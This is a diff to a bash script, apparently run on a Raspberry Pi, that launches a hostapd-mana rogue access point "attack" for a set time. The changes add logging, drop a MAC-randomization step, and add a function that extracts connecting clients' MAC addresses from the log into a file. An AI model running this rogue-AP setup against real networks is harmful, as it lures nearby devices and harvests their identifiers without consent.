@@ -33,10 +33,11 @@ echo "wpa_pairwise=TKIP CCMP" >> $config_file
 echo "wpa_passphrase=$wpa_passphrase" >> $config_file
 echo "auth_algs=3" >> $config_file
 
-sleep 5
-
-#Randomize MAC for safety
-sudo macchanger -r $interface_wlx
+#testlogging
+echo "logger_syslog=-1" >> $config_file
+echo "logger_syslog_level=2" >> $config_file
+echo "logger_stdout=-1" >> $config_file
+echo "logger_stdout_level=2" >> $config_file
 
 #pause
 sleep 5
@@ -47,10 +48,18 @@ sudo ifconfig $interface_wlx up
 #pause
 sleep 5
 
-# Run the attack for the specified duration
-sudo /home/$real_user/src/hostapd-mana/hostapd/hostapd -i $interface_wlx $config_file &
-sleep $duration
-sudo kill $!
+# Function to extract unique MAC addresses and save to a file
+extract_and_save_macs() {
+    grep -v 'Using interface' /home/pi/src/work/$AP_ssid-mana.log | grep -oE '([[:xdigit:]]{2}:){5}[[:xdigit:]]{2}' | sort | uniq > /home/pi/src/work/$AP_ssid-mana-unique-macs.txt
+}
 
-# Post attack (re-enable the kismon interface selected by the user, not the $interface_changed)
-# renable the kismon interface selected by the user not the $interface_changed
+# Trap SIGINT (Ctrl+C) and SIGTERM to run the extract_and_save_macs function before exiting
+trap 'extract_and_save_macs; sudo kill $!; exit' SIGINT SIGTERM
+
+# Run the attack for the specified duration
+sudo /home/$real_user/src/hostapd-mana/hostapd/hostapd -i $interface_wlx $config_file 2>&1 | sudo tee -a /home/pi/src/work/$AP_ssid-mana.log &
+sleep $duration
+
+# If the script reaches this point, extract MAC addresses and kill the hostapd-mana process
+extract_and_save_macs
+sudo kill $!
